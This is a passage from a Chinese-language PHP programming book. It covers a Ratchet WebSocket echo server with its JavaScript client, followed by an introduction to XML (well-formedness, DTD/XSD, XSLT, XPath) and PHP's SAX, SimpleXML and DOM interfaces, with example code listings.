Web 套接字具有众多优势。除了性能更好之外，Web 套接字协议还提供双向性，这意味着即使在建立连接后，服务器也可以持续向客户端发送数据。与常见的 HTTP 拉取方式（客户端请求数据，只有此时服务器才发送数据）相比，这种方式自然显得过时。

> **Web 套接字标准化**
> 
> Web 套接字协议是互联网工程任务队（IETF）的官方 RFC：RFC 6455（https://tools.ietf.org/html/rfc6455）。
> 
> W3C 也曾在 www.w3.org/TR/websockets 长期设有 Web 套接字专区。起初在大约十年的时间里不再维护；此后已转移至 Web 超文本应用技术工作组（WHATWG）的 https://websockets.spec.whatwg.org/，该技术的所有后续工作均在此进行。

要让应用程序使用 Web 套接字，客户端和服务器必须做好相应准备。客户端必须通过 JavaScript 发送 Web 套接字连接请求，服务器必须能够相应处理。后者使用 PHP 自带资源相当耗时，因此我们使用外部组件。

### 28.4.1 服务器

Web 套接字协议有多个版本，服务器的任务之一是正确支持每个版本；如我们稍后将看到，浏览器大致会自动完成此操作。但我们不是自己实现一切，而是依赖一个名为 Ratchet 的成熟包。在趣味 URL http://socketo.me（参见图 28.5）上，有关该包的信息和可在线试用的演示，但没有直接下载。

目前，Ratchet 只能通过 Composer 包管理器安装。在第 38 章中，您将找到更多相关信息；此外，您还将学习如何在系统上安装 Composer。对于以下说明，我们假设此操作已完成。

![](img/ae7820c36e8f24c1623d26668b28e80e_781_0.png)

图 28.5 Ratchet 主页

现在通过 Composer 在项目目录中安装 Ratchet 包：

```
composer require cboden/ratchet
```

如果您没有全局安装 Composer，但 composer.phar 可用，请使用以下命令：

```
php /path/to/composer.phar require cboden/ratchet
```

然后 Ratchet 将安装在系统上。甚至支持自动加载；vendor/autoload.php 文件已相应创建或调整。只需 require "vendor/autoload.php"（如有必要可自定义路径）即可加载 Ratchet 所需的所有类（参见图 28.6）。

![](img/ae7820c36e8f24c1623d26668b28e80e_782_0.png)

图 28.6 通过 Composer 安装 Ratchet

Ratchet 具有一个同名命名空间及其下的若干类。让我们先看看 MessageComponentInterface 接口，它定义了四个方法：

- onOpen()
  建立与 Web 套接字服务器的连接时调用
- onClose()
  与 Web 套接字服务器的连接再次关闭时调用
- onMessage()
  向服务器发送消息时调用
- onError()
  发生错误时调用

在我们的示例中，我们想要实现一个简单的服务器，将所有发送给它的消息原样返回。因此，我们只需为 onMessage() 方法提供具体实现。这可以如下所示：

```php
class EchoServer implements Ratchet\MessageComponentInterface {
    public function onOpen(Ratchet\ConnectionInterface $conn) {}
    public function onMessage(Ratchet\ConnectionInterface $from, $msg) {
        $from->send($msg);
    }

    public function onClose(Ratchet\ConnectionInterface $conn) {}

    public function onError(Ratchet\ConnectionInterface $conn, Exception $e) {}
}
```

接下来，我们需要确保为 Web 套接字调用实现一个端点。为此，我们需要 Ratchet 中的一些类（此处未显示相关命名空间）：

- IoServer 是 Ratchet 中服务器的通用基类。
- HttpServer 创建可接收 HTTP 请求的服务器。
- WsServer 基于 HTTP 服务器实现 Web 套接字服务器。

以下嵌套调用为我们的 EchoServer 实现创建 Web 套接字服务器，并在端口 12345 上运行：

```php
$server = Ratchet\Server\IoServer::factory(
    new Ratchet\Http\HttpServer(
        new Ratchet\WebSocket\WsServer(
            new EchoServer()
        )), 12345);
$server->run();
```

清单 28.4 展示了完整代码的概览：自动加载、类实现和服务器实例化。

```php
<?php
require "./vendor/autoload.php";

class EchoServer implements Ratchet\MessageComponentInterface {
    public function onOpen(Ratchet\ConnectionInterface $conn) {
    }

    public function onMessage(Ratchet\ConnectionInterface $from, $msg) {
        $from->send($msg);
    }

    public function onClose(Ratchet\ConnectionInterface $conn) {
    }

    public function onError(Ratchet\ConnectionInterface $conn, Exception $e) {
    }
}

$server = Ratchet\Server\IoServer::factory(
    new Ratchet\Http\HttpServer(
        new Ratchet\WebSocket\WsServer(
            new EchoServer())), 12345);
$server->run();
?>
```

清单 28.4 带有 Ratchet 的 Web 套接字服务器（"echo.php"）

现在可以在命令行中启动此服务器：

```
php echo.php
```

### 28.4.2 客户端

唯一缺少的是客户端——因此也是 JavaScript。Web 套接字的编程接口看起来非常简单，基本由以下组件组成：

- WebSocket 是基类。
- send() 方法向服务器发送消息。
- 有一系列事件，与清单 28.4 中的服务器实现类似，例如 open 和 message。

在与服务器建立连接时，其地址会传递给 WebSocket 类的构造函数。3 我们使用 ws:// 作为协议，因此在本例中 URL 为 ws://127.0.0.1:12345：Web 套接字协议，本地运行的服务器，端口 12345。

以下代码在连接建立后（open 事件）向服务器发送经典的 "Hello world" 消息：

```javascript
var ws = new WebSocket("ws://127.0.0.1:12345");
ws.onopen = function() {
    ws.send("Hello world!");
}
```

3 当然，严格来说它在 JavaScript 中不是类，也不是构造函数，但在这种情况下功能非常相似，因此我们将沿用此描述。





如果触发了消息事件，则表示服务器已向客户端发送数据。处理该事件的函数接收一种数组，实际的服务器信息位于 data 键之后。以下代码以简洁且无痛的方式在模态消息窗口中显示此内容：

```
ws.onmessage = function(e) {
    alert(e.data);
}
```

清单 28.5 展示了一个稍微扩展的示例：如果你在文本输入字段中输入一些内容并点击按钮，那么你的输入将被发送到 WebSocket 服务器，并且返回结果会被显示（理想情况下应为相同的文本）。图 28.7 展示了它在浏览器中的工作方式。

```
<!DOCTYPE html>
<html>
<head>
<title>WebSockets</title>
<script>
var ws = new WebSocket("ws://127.0.0.1:12345");
ws.onmessage = (e) => {
    alert("Data from server: " + e.data);
}

window.onload = () => {
    document.getElementById("btn").addEventListener("click", (e) => {
        var input = document.getElementById("input").value;
        ws.send(input);
    })
}
</script>
</head>
<body>
<form>
<textarea id="Input"></textarea>
<input type="button" id="btn" value="Send">
</form>
</body>
</html>
```

清单 28.5 带 HTML 和 JavaScript 的 WebSocket 客户端 ("websockets.html")

![](img/ae7820c36e8f24c1623d26668b28e80e_786_0.png)

图 28.7 WebSocket 示例实战

这只是 WebSocket 的初步介绍，也是朝着具有大量 JavaScript 逻辑和高性能实时通信的现代应用迈出的第一步。

## PART VI

## 数据格式

# 第 29 章

XML

*XML 已确立自身作为数据交换的通用标准以及大多数常见描述语言的基础。*

当今是否存在一款软件产品，没有用大字醒目地印上装饰性缩写 XML？除了游戏领域，要找到一款这样的产品可能颇为困难。文字处理器生成 XML，排版程序输出 XML，CMS X 和 Y 以及数据库 Z 均支持可扩展标记语言。

## 29.1 准备工作

本章的准备工作不仅包括安装，还包括在开头对 XML 的简要介绍。如果你已经熟悉它，可以轻松跳过。这将有助于其他所有人理解本章中的示例。然而，为了更深入的介绍，推荐进一步的书籍。

### 29.1.1 XML 基础

XML 已被 W3C 标准化为一种数据存储格式。其前身是标准通用标记语言（SGML），后者仍由国际标准化组织（ISO）标准化。XML 是 SGML 的一个子集，其特点主要在于规则更严格。

> **注意**
> 
> HTML5 在标准表示法中实际上并非有效的 XML。不过，也可以为 HTML5 选择一种 XML 兼容的表示法：XHTML (http://s-prs.co/v602241)。

#### 格式正确：XML 的规则

XML 文档由标签组成，标签是尖括号内的命令。数据被封装在标签内。标签也可以被赋予属性。到目前为止，这都与 HTML 类似。在 XML 中，标签的名称不是预定义的；相反，名称应描述数据内容。然而，对于标签和 XML 文档特别是如何结构化，是有规则的。如果 XML 文档遵循所有这些规则，则被称为格式正确。以下是 XML 文档必须遵守的最重要规则，以使其格式正确：

- XML 区分大小写；因此 `<title>` 与 `<Title>` 或 `<TITLE>` 不同。这对旧派 HTML 开发者来说需要一些时间来适应，因为 HTML 标签过去常被花哨地书写。

- 所有标签必须关闭。如果标签没有内容，也可以使用短形式关闭——即，

```
<delivery date="10.11.2026" />
```

而不是

```
<delivery date="10.11.2026"></delivery>
```

> **注意**
> 如果你想将 HTML 文档转换为 XHTML，则此规则下最常见的问题候选项是 `<br>` 和 `<hr>` 标签，它们随后变为 `<br />` 和 `<hr />`。

- 标签不得交叉嵌套。

```
<delivery><date></delivery></date>
```

因此不允许。

- 属性必须始终有一个值。这意味着

```
<delivery completed />
```

是不可能的，但

```
<delivery arrived="true" />
```

是可能的。

- 属性的值必须始终用引号括起来。

- XML 中的标签名和属性必须以字母或下划线 (_) 开头。所有后续字符可以由字母、数字、连字符和点组成。XML 关键字作为名称组件被禁止；你应该避免使用冒号，因为它用于命名空间。

- XML 文档只能有一个根元素。这必须包含所有其他标签。

- 文档需要 XML 标签，也称为 XML 声明。它包含 XML 版本和所使用的字符集。此处的标准是 UTF-8。

以下清单展示了一个格式正确文档的示例。

```
<?xml version="1.0" encoding="UTF-8" ?>
<products>
<product>
<title>Vacuum cleaner XY</title>
<price currency="Euro">4.80</price>
</product>
</products>
```

清单 29.1 一个格式正确的 XML 文档 ("wellformed.xml")

### 有效：DTD 和架构

格式正确的 XML 文档是使用 XML 实现（例如在 PHP 中）的基本要求。但是，XML 文档可以满足另一个标准：它可以是有效的。这里的有效是指 XML 文档遵循预定义的结构。该结构可以使用两种技术来定义：

- 文档类型定义 (DTD)
- XML 架构定义 (XSD)

这两项标准均由 W3C 发布。DTD 的功能范围稍小（例如，它不支持内容的不同数据类型）并且是一种不基于 XML 的独立语言。另一方面，DTD 更古老且相当简单。它至今仍在使用，例如，用于 W3C 指定的 HTML 和 XHTML 文档类型。但是，HTML5 没有明确的 DTD。

XSD 消除了 DTD 的缺点：该标准基于 XML 并提供了大量更多选项。W3C 的所有较新的基于 XML 的标准，例如 SOAP（用于 Web 服务），都在 XSD 中定义。

**注意**

如果你创建自己的文档结构，为其编写 DTD 或架构是有意义的。这样更容易确定不同文档是否具有相同的结构。即使合并不同文档，你也拥有更多控制权。然而，DTD 和架构对于在 PHP 中使用 XML 并不是决定性的。无论 XML 文档是否经过验证，都可以访问它。PHP 中验证直接出现的一个地方是一个用于 DTD 验证的 PEAR 包。库 libxml 也可以验证，并且还理解 RELAX NG，这是一种替代架构语言。然而，PHP 的基本 XML 库也支持验证。

### 命名空间

标签可以被分配到特定的命名空间。在合并多个 XML 文档时，命名空间特别有用。例如，<price> 标签在不同文档中可以具有完全不同的功能。如果它属于一个命名空间，这将确保清楚涉及哪种格式。

### XSLT

可扩展样式表语言转换（XSLT）是 XSL 的一种子语言。XSL 为 XML 文档定义样式。XSLT 用于转换 XML 文档——因此其名称中有“转换”一词。转换可以是横向的——即从一种 XML 格式转换为另一种——也可以是纵向的——即 XML 变为 HTML5 或 JSON 等用于结构化数据的输出格式。

XSLT 使用所谓的模板。为标签指定一个模板。要为标签输出的代码位于模板内部。更深层嵌套的信息通过嵌套模板实现。

清单 29.2 显示了一个简单示例，它将清单 29.1 中的 XML 文件转换为 HTML。

```
<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
version="1.0">
<xsl:output indent="yes" method="html" />

<xsl:template match="/">
<xsl:apply-templates />
</xsl:template>

<xsl:template match="products">
<html>
<head>
<title>Products</title>
</head>
<body>
<table align="center" width="500" border="1">
<tr>
<th>Product</th>
<th>Price</th>
</tr>
<xsl:apply-templates select="product" />
</table>
</body>
</html>
</xsl:template>

<xsl:template match="product">



```xml
<tr>
    <td><xsl:value-of select="title" /></td>
    <td><xsl:value-of select="price" /></td>
</tr>
</xsl:template>
</xsl:stylesheet>
```

## 代码清单 29.2 用于转换为 HTML 的 XSLT ("inHTML.xslt")

products 根元素的模板包含 HTML 页面的完整基本结构。在要插入单个产品的位置，会引用 product 标签的模板。然后会在那里显示 title 和 price 的值。

## XPath

XML 文档以层级方式组织。使用 XSLT，可以通过模板寻址单个标签——但在标签层级中仍然没有更有效的搜索方法。XPath 就是为此而使用的。某些语法有点类似控制台中的目录访问：

```
/products/product/title
```

这一行访问代码清单 29.1 中位于 products 和 product 下方的 title 标签。这就是路径。此外，或单独使用，你还可以指定所谓的轴。它确定搜索执行的方向。例如，Child 搜索子节点。轴后面跟着冒号和条件。

```
Child::product
```

> **注意**
> 在实践中，XPath 主要与其他 XML 标准配合使用。例如，XSLT 中的 match 规范是一个 XPath 构造，可以使用所有 XPath 函数。

## XQuery

仅靠 XPath 几乎不足以执行 XML 文档的所有可想象查询。因此，W3C 创建了另一种基于 SQL 模型的查询语言 XQuery。在实践中，XQuery 使用得不多，尤其是在数据库领域，因为只有查询机制，没有更新或修改选项。

> 注意
> 小心缩写和产品名称：例如，Software AG 的 XML Tamino 数据库使用一种称为 X-Query 的查询语言，它与 XQuery 不同。

## XML 编程

假设你的 XML 文档需要以某种方式在 PHP 中处理。一种方法是使用 XSLT。但是，如果你只想访问文档中非常特定的部分，则需要一个 XML 编程接口：即解析器。在实践中，三种解析器方法已被确立：

- SAX 解析器，或面向事件的访问
- 通过 DOM 树访问，它将 XML 文档视为一棵树
- 混合形式或内部开发

SAX 代表 *简单 XML API*。使用这种访问变体，XML 文档从左上角到右下角进行遍历。开始标签和结束标签以及属性会生成事件。然后你可以使用方法对这些事件做出反应。SAX 未经标准化；它最初源自一个 Java 项目。SAX 的官方网站位于 www.saxproject.org。SAX 现在也可在开源的 SourceForge 网站上找到（http://sourceforge.net/projects/sax）。

与 SAX 相反，DOM 访问由 W3C 标准化（www.w3.org/DOM）。XML 文档被加载到内存中作为层级树，然后可以使用预定义方法访问树的各个分支——即所谓的节点。

第三种方法是内部开发。例如，自 PHP 5 起，就有了出色的 SimpleXML 接口。ASP.NET 还提供了自己的方法，即 XmlTextReader 和 XmlTextWriter，它们与 SAX 类似——但只是有所区别的类似。

> 注意
> 在实践中，经验法则是：SAX 速度明显更快，而 DOM 会消耗大量资源，因为整个文档都必须加载到内存中。另一方面，DOM 开发要灵活得多。SimpleXML 最简单。

### 29.1.2 安装

自 PHP 5 以来，XML 设置非常简单。PHP 8 中的 XML 支持也完全基于 libxml2。SAX 和 DOM 支持不需要安装。

libxslt 负责 XSLT。在 Linux 下，使用 --with-xsl[=path] 配置 PHP。

在 Windows 下，通过删除分号来注释掉以下行：

```
extension=php_xsl.dll
```

## 29.2 XML 访问

现在是开始实际工作的时候了。在以下各节中，我们将使用各种方法来访问和编辑 XML 文档。

### 29.2.1 SAX

SAX 解析器（或 XML 解析器）会遍历 XML 文档并对事件做出反应。SAX 解析器乍一看可能有点复杂，但实际上并不复杂。我们将通过一个简单的示例向你展示最重要的步骤。

注意
我们的起点是代码清单 29.1 的扩展版本。你可以在书籍的在线材料中找到名为 products.xml 的文件（参见前言）。

1. 首先创建 SAX 解析器：

   ```
   $xml_parser = xml_parser_create();
   ```

2. 现在你需要一个带有两个函数的事件处理程序。当 SAX 解析器生成事件时，它们会做出反应。有两种类型的事件：一种是解析器遇到开始标签时，另一种是找到对应的结束标签时：

   ```
   xml_set_element_handler($xml_parser,
   "elem_start", "elem_end");
   ```

3. elem_start() 和 elem_end() 函数将解析器本身、标签名（这里是 $name 变量）以及包含标签所有属性的关联数组（这里是 $attribute 变量）作为参数。在我们的示例中，我们将每个标签的名称放在尖括号中。每个标签末尾都会跟随一个换行：

   ```
   function elem_start($xml_parser, $name, $attribute) {
   echo "&lt;" . $name . "&gt;";
   }
   function elem_end($xml_parser, $name) {
   echo "<br />";
   }
   ```

4. 现在问题是数据会发生什么。另一个事件处理程序负责此事，它会调用一个函数（这里是 cdata）：

   ```
   xml_set_character_data_handler($xml_parser, "cdata");
   ```

5. 此函数在使用 htmlspecialchars() 将特殊字符转换为 HTML 形式后输出数据：

   ```
   function cdata($xml_parser, $data) {
       echo htmlspecialchars($data);
   }
   ```

6. 至此，XML 文件尚未被读入。这是由 `file_get_contents(XML file)` 函数完成的：

   ```
   $data = file_get_contents("products.xml");
   ```

7. 然后解析数据。这是关键步骤：

   ```
   xml_parse($xml_parser, $data, true);
   ```

8. 最后，你可以释放解析器。自 PHP 4 起，这已不再必要，因为 PHP 会自动监控此事。但是，为了整洁并保持与 PHP 3 的兼容性，你可以执行以下操作：

   ```
   xml_parser_free($xml_parser);
   ```

> **注意**
> 在 PHP 8 中，PHP 在内部将其自身的 XML 解析器从资源切换到 XMLParser 对象（[http://s-prs.co/v602284]）。但是，出于向后兼容性的原因，`xml_parser_free()` 函数仍然被允许，即使它已不再必要。

代码清单 29.3 包含完整代码，图 29.1 显示其输出。

## 代码清单 29.3 SAX 支持 ("sax.php")

```
<?php
function elem_start($xml_parser, $name, $attribute) {
    echo "&lt;" . $name . "&gt;";
}

function elem_end($xml_parser, $name) {
    echo "<br />";
}

function cdata($xml_parser, $data) {
    echo htmlspecialchars($data);
}

$xml_parser = xml_parser_create();
xml_set_element_handler($xml_parser,
    "elem_start", "elem_end");
xml_set_character_data_handler($xml_parser, "cdata");
$data = file_get_contents("products.xml");
xml_parse($xml_parser, $data, true);
xml_parser_free($xml_parser);
?>
```

![](img/ae7820c36e8f24c1623d26668b28e80e_797_0.png)

图 29.1 使用 SAX 解析器的输出

> **注意**
> 这就是基本原理。现在，你当然可以更改一些内容以获得更精确的结果。更多详细信息将在以下部分中提供。

### 解析器选项

使用 `xml_parser_set_option(Parser, Option, Value)` 函数，你可以为解析器行为分配更多选项。以下规格是可能的：

- XML_OPTION_CASE_FOLDING 控制解析器如何处理大写和小写字符。默认情况下，该选项设置为 1（即 true）。这意味着所有标签都转换为大写。如果将选项设置为 0（即 false），解析器会保持字母的原始状态（参见图 29.2）。

![](img/ae7820c36e8f24c1623d26668b28e80e_797_1.png)

图 29.2 多亏了 "XML_OPTION_CASE_FOLDING"，所有标签名现在都保持原始状态





- 使用 XML_OPTION_TARGET_ENCODING，您可以指定数据的字符集。您可以选择 ISO-8859-1、US-ASCII 或 UTF-8。如果使用来自此字符集的特定字符，请选择您的 XML 文档所使用的字符集。

- XML_OPTION_SKIP_WHITE 控制解析器是否忽略空白字符（空格、制表符等）。

> 注意
> 使用 xml_parser_get_option(Parser, Option) 可以读取其中一个选项。
> 例如，用于查找编码时，这非常实用。

### 收集残余元素

使用 SAX 解析器处理 XML 文档时，有些元素会被遗漏，例如 XML 声明或 DTD。您可以使用 xml_set_default_handler(Parser, "Function") 和事件处理程序来处理这些剩余元素。

还有一些非常少使用的两个事件处理程序：

- xml_set_processing_instruction_handler() 过滤处理指令。例如，PHP 标签 `<?php` 和 `?>` 就是处理指令。

- xml_set_unparsed_entity_decl_handler(Parser, Handler) 定义一个函数，用于过滤 DTD 中的所有 NDATA 节（此处 N 代表 no）。

### 区分标签

使用 SAX 时，关键在于思维方式。始终意识到解析器是从上到下处理文档的。这也使得您的事件处理程序被调用的顺序变得清晰。当然，实现目标有多种方法。最简单的通常是使用情况区分。

在以下示例中，我们使用情况区分来读取标题。为此，我们定义了自己的 CDATA 事件处理程序。但是，对于所有其他标签——在此示例中主要是价格——我们定义了一个不输出任何内容的不同 CDATA 事件处理程序。通过这个简单的技巧，会输出标题，但不会输出其他内容（参见图 29.3）。

```
<?php
function element_start($xml_parser, $name, $attribute) {
    if ($name=="title"){
        echo "Product: ";
        xml_set_character_data_handler($xml_parser, "cdata_output");
    } else {
        xml_set_character_data_handler($xml_parser, "cdata_not_output");
    }
}

function element_end($xml_parser, $name) {
    if ($name=="title") {
        echo "<br />";
    }
}
function cdata_not_output($xml, $data) {
}
function cdata_output($xml, $data) {
    echo htmlspecialchars($data);
}

$xml_parser = xml_parser_create();
xml_parser_set_option($xml_parser, XML_OPTION_CASE_FOLDING, 0);
xml_set_element_handler($xml_parser,
    "element_start", "element_end");
xml_set_character_data_handler($xml_parser, "cdata_output");
$data = file_get_contents("products.xml");
xml_parse($xml_parser, $data, true);
xml_parser_free($xml_parser);
?>
```

### 清单 29.4 更精确地控制输出 ("sax_exact.php")

同样重要的是，将 XML_OPTION_CASE_FOLDING 选项设置为 false；否则，标签将被转换为大写字母。

![](img/ae7820c36e8f24c1623d26668b28e80e_799_0.png)

### 图 29.3 输出仅包含产品，不包含价格

### 29.2.2 SimpleXML

正如其名称所示，SimpleXML 是访问 XML 文档的一种非常简单的方法。SimpleXML 不基于 SAX，也不基于 DOM，而是一种专有解决方案。

> **注意**
> 本节使用的示例 XML 文件同样是 products.xml。

### 基本原理

在 SimpleXML 中，每个节点都可以通过其名称访问。起点是使用 SimpleXML 加载文件时获得的根元素：

```
$sim = simplexml_load_file("products.xml");
```

或从字符串加载：

```
$sim = simplexml_load_string(XML-String);
```

$sim 现在包含对根元素的引用。使用

```
$sim->product,
```

您可以引用第一个 product 标签。但是，如果输出此内容，您将看不到任何内容。这是因为 SimpleXML 仅输出标签的文本内容。

在以下行中，title 标签具有文本内容：

```
print $sim->product->title;
```

这就是为什么这一行会输出吸尘器 XY。

我们的示例 XML 文件中有多个 product 标签（参见图 29.4）。您可以使用数组轻松区分它们：

```
print $sim->product[1]->title
```

这将访问第二个产品，然后显示标题 Teapot AB。

![](img/ae7820c36e8f24c1623d26668b28e80e_800_0.png)

### 图 29.4 从根元素开始的 SimpleXML 构造结构

在 SimpleXML 中，属性作为关联数组分配给标签。因此，如果您想访问 price 标签中的货币，操作方法如下：

```
print $sim->product->price["currency"];
```

要访问多个或所有标签，可以使用循环。以下示例遍历所有产品，并在 HTML 表中输出标题、价格和货币（参见图 29.5）。

```
<?php
$sim = simplexml_load_file("products.xml");
print '<table border="1" cellpadding="5" align="center">';
foreach ($sim->product as $product) {
print '<tr><td>';
print $product->title;
print '</td><td>';
print $product->price . ' ' . $product->price["currency"];
print '</td></tr>';
}
print '</table>';
?>
```

### 清单 29.5 SimpleXML 的使用 ("simpleXML.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_801_0.png)

### 图 29.5 来自 XML 文件的 HTML 表

> 提示
> 最后一个示例与稍后在清单 29.15 中显示的 XSLT 结果相匹配。这就提出了一个问题：在实际中应该使用哪种方法。如果需要非常快速地完成，SimpleXML 无疑更简单。XSLT 的优势在于，切换到另一种编程语言时，不需要重写整个转换脚本，只需重写几行代码。但是，使用 XSLT 很难将内容（通常是 HTML 模板）与转换逻辑分开。而使用 SimpleXML，您可以使用任何 PHP 模板系统，例如 Smarty。

### 其他方法

children() 和 attributes() 方法能为您多做一些工作。它们允许您直接访问元素的子节点或属性。第一次调用时返回第一个对象。然后，您可以循环遍历所有子节点或属性。

```
<?php
$sim = simplexml_load_file("products.xml");
foreach ($sim->children() as $child) {
    print $child->title . "<br />";
}
?>
```

### 清单 29.6 "children()" 的使用 ("simpleXML_methods.php")

### XPath

如果标准访问对您来说功能不够强大，可以使用 SimpleXML 的 XPath 实现。这是通过 xpath(expression) 方法完成的，该方法接收 XPath 表达式作为参数，并返回找到的第一个位置。使用循环遍历所有找到的位置。

在以下示例中，我们使用 XPath 读取所有 title 标签。

```
<?php
$sim = simplexml_load_file("products.xml");
foreach ($sim->xpath("*/title") as $title) {
    print "$title<br />";
}
?>
```

### 清单 29.7 带 SimpleXML 的 XPath ("simpleXML_XPath.php")

其特别之处在于，层次结构中其他位置的 title 标签也会被返回。与 XPath 相比，使用普通 SimpleXML 访问需要付出大幅更多的努力。

### 写入

最后但同样重要的是，使用 SimpleXML 不仅可以读取和搜索文档，还可以向其中写入新内容。为此，只需访问一个标签并插入新内容即可。您也可以以同样的方式更改属性。还可以向元素添加新属性。以下脚本展示了所有三种可能的更改。最后，使用 asXML() 方法将修改后的 XML 作为字符串返回。图 29.6 显示了修改后的文件。

```
<?php
if ($sim = simplexml_load_file("products.xml")) {
    $sim->product[1]->title = "Coffee pot AB";
    $sim->product[1]->title["changed"] = date("d.m.Y");
    $sim->product[1]->price["currency"] = "Euro";
    print "<pre>" . htmlentities($sim->asXML()) . "</pre>";
}
?>
```

### 清单 29.8 使用 SimpleXML 修改 XML ("simpleXML_edit.php")

> 注意
> asXML() 方法不仅可以返回字符串，还可以返回文件。为此，只需将文件名作为参数指定即可：
> $sim->asXML("products2.xml");

![](img/ae7820c36e8f24c1623d26668b28e80e_803_0.png)

### 图 29.6 修改后的 XML 文件

### SimpleXML 和 DOM

SimpleXML 不允许添加新标签。为此，您需要 DOM 访问。但是，这并不意味着您必须放弃 SimpleXML 的便利性。以下两个方法确保 DOM 对象与 SimpleXML 对象之间的 1:1 转换：

- simplexml_import_dom(DOM 对象) 将 DOM 对象转换为 SimpleXML 对象：
  $sim = simplexml_import_dom($dom);
- dom_import_simplexml(SimpleXML 对象) 采用相反的方法，将 SimpleXML 转换为 DOM 对象：
  $dom = dom_import_simplexml($sim);

### 29.2.3 DOM 访问

DOM 访问是访问 XML 元素最灵活的方式。它是面向对象的，并使用 W3C 规范中规定的名称。

> 注意
> XML 的 DOM 已在 PHP 4 中存在，但不幸的是，旧实现未使用 DOM 规范的官方名称。





## 访问

第一步是使用 DOMDocument 对象访问 XML 文档：

- 1. 首先创建一个新的 DOMDocument 对象：

```php
$dom = new DOMDocument();
```

- 2. 然后使用 load(file) 加载 XML 文档：

```php
$dom->load("products.xml");
```

> 注意
> 除了 load()，还有几种填充 DOMDocument 对象的替代方法。loadXML(String) 从字符串加载对象，loadHTML() 从 HTML 字符串加载，loadHTMLFile() 从 HTML 文件加载。与 XML 不同，HTML 在加载时不必格式良好。这在实践中通常很有用。

- 3. 使用 saveXML()，你可以将 DOM 树作为字符串返回。如果指定一个节点作为可选参数，则仅输出该节点及其子节点：

```php
$dom->saveXML();
```

在以下简单示例中，DOM 树在 <pre> 标签中输出；你可以在图 29.7 中看到浏览器中的输出。

```php
<?php
$dom = new DOMDocument();
$dom->load("products.xml");
print "<pre>" . htmlentities($dom->saveXML()) . "</pre>";
?>
```

## 清单 29.9 在浏览器中输出 XML ("dom.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_804_0.png)

## 图 29.7 作为输出的 XML 文件

> 注意
> 如果要将 XML 文档保存到文件，请使用 save(File)。saveHTML() 和 saveHTMLFile(File) 在字符串或文件中生成 HTML。

## 元素和标签

访问 DOM 有两种方式：你可以在 DOM 树中从一个节点导航到另一个节点，也可以直接访问单个标签或标签组。在日常工作中，通常两者结合才能达到目标。以下两个函数可用于直接导航：

- getElementsByTagName(Name) 查找所有名称作为参数传递的标签，并将其作为数组返回。

- getElementById(ID) 返回 ID 属性与参数匹配的元素。

在以下示例中，使用了 getElementsByTagName()。将搜索所有 title 标签的内容。

```php
<?php
$dom = new DOMDocument();
if ($dom->load("products.xml")) {
    $elements = $dom->getElementsByTagName("title");
    foreach ($elements as $element) {
        print $element->textContent . "<br />";
    }
}
?>
```

## 清单 29.10 DOM 访问 ("dom_access.php")

查看已更改的各个行：

- 1. DOMDocument 的创建是面向对象的。

- 2. getElementsByTagName(Name) 方法返回一个 DomNode 对象。

- 3. 然后可以遍历节点。要访问节点的文本内容，PHP 提供了 textContent 属性。这不符合 W3C 标准。如果你想完全遵守标准，则需要编写以下内容：

```php
$element->firstChild->data
```

## 操作 DOM

在本节中，你将看到一个关于 DOM 操作如何工作的示例。这里使用了一些重要的 DOM 函数。

示例脚本有以下任务：它应该允许用户使用表单条目将新数据记录附加到 XML 文件的末尾。起点是熟悉的 _products.xml_ 文件，你当然也可以在书籍的在线材料中找到它（请参见前言）。

- 1. 第一步，你需要一个包含三个表单字段的表单，分别用于标题、价格和货币。我们选择了 POST 作为提交方法。

- 2. PHP 脚本首先检查表单是否已提交并且标题是否已设置：

```php
if (isset($_POST["send"]) && $_POST["title"] != "") {
```

- 3. 如果是，则打开 XML 文件：

```php
$dom->load(realpath("products.xml"), LIBXML_NOBLANKS);
```

> 注意
> DOM 解析器也将空格等（空白字符）识别为节点。在遍历 DOM 树时这不太方便。因此，我们在这里使用 LIBXML_NOBLANKS 选项删除空白字符。

- 4. 接下来，为表单中的信息创建新的 product 标签：

```php
$new = $dom->createElement("product");
```

- 5. 然后为标题和价格创建子元素：

```php
$title = $dom->createElement("title");
$price = $dom->createElement("price");
```

- 6. setAttribute() 将货币设置为 price 元素的属性：

```php
$price->setAttribute("currency", $_POST["currency"]);
```

- 7. 使用 createTextNode() 将表单字段的内容分配给它们。使用 appendChild()，你将这两个文本节点插入到新的标题和价格元素下：

```php
$titleContent = $dom->createTextNode($_POST["title"]);
$priceContent = $dom->createTextNode($_POST["price"]);
$title->appendChild($titleContent);
$price->appendChild($priceContent);
```

- 8. 到目前为止，新元素仅虚拟存在；它们尚未悬挂在 DOM 树中。为此，使用 documentElement 属性获取根元素，并使用 appendChild() 将新产品附加上去以连接新产品节点：

```php
$root = $dom->documentElement;
$root->appendChild($new);
```

- 9. 然后将标题和价格节点附加到这些节点上：

```php
$new->appendChild($title);
$new->appendChild($price);
```

- 10. 最后，使用 saveXML() 将修订后的 XML 文档作为字符串输出：

```php
print "<pre>" . htmlentities($dom->saveXML()) . "</pre>";
```

> **注意**
> 或者，你也可以使用 save(file) 将其写入文件。

清单 29.11 显示了带表单的完整代码；你可以在图 29.8 中看到输出。

```php
<?php
if (isset($_POST["send"]) && $_POST["title"] != "") {
    $dom = new DOMDocument();
    $dom->load(realpath("products.xml"), LIBXML_NOBLANKS);

    $new = $dom->createElement("product");
    $title = $dom->createElement("title");
    $price = $dom->createElement("price");
    $price->setAttribute("currency", $_POST["currency"]);

    $titleContent = $dom->createTextNode($_POST["title"]);
    $priceContent = $dom->createTextNode($_POST["price"]);
    $title->appendChild($titleContent);
    $price->appendChild($priceContent);

    //Append new element
    $root = $dom->documentElement;
    $root->appendChild($new);

    $new->appendChild($title);
    $new->appendChild($price);
    //Output in HTML:
    print "<pre>" . htmlentities($dom->saveXML()) . "</pre>";

    //Write to file:
    $dom->save('products_new.xml');
}
?>
<html>
<head>
<title>New entry</title>
</head>
<body>
<form method="POST">
<input type="text" name="title" /> Product title<br />
<input type="text" name="price" /> Price<br />
<input type="text" name="currency" /> Currency<br />
<input type="submit" name="send" value="Enter" />
</form>
</body>
</html>
```

## 清单 29.11 使用 DOM 树 ("dom_edit.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_808_0.png)

## 图 29.8 修改后的 XML 文件

## XPath

